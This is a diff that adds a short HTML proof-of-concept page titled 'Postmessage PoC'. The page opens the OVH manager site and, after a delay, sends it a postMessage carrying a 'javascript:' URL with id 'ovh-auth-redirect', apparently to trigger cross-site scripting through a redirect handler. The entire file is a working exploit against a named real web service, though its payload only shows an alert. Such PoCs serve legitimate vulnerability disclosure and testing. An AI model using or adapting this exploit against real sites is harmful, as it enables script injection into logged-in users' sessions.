@@ -1,0 +1,19 @@
+
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <title>Postmessage PoC</title>
+        <script>
+                let win = window.open('https://www.ovh.com/manager/');
+                let msg = {id: "ovh-auth-redirect",url: "javascript:alert(document.domain)"};
+                setTimeout(function(){
+                    win.postMessage(msg, '*');
+                }, 7000);
+            
+        </script>
+    </head>
+    <body>
+                     
+    </body>
+</html>
